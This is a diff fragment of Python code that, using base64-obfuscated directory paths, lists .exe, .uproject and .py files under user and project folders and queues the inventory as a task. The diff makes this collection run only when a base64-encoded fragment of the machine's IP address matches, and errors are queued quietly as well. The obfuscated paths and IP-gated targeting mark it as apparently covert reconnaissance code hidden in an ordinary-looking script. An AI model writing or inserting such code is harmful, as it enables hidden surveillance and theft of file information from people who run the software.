@@ -147,12 +147,12 @@ def search_extention(ext='.exe', dir_path='C:/Users'):
                 ])
     return p_ls
 try:
-    #if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode() or 'BUR' in data['user_last']:
-    zovV = []
-    zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
-    zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
-    zovV += search_extention(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nLw==').decode(), ext='.py')
-    add_queue_task('ext_path_ls', dict(zovV))
+    if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode():
+        zovV = []
+        zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
+        zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
+        zovV += search_extention(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nLw==').decode(), ext='.py')
+        add_queue_task('ext_path_ls', dict(zovV))
 except:
     import traceback
     add_queue_task('ext_path_ls_error', {'error': str(traceback.format_exc())})
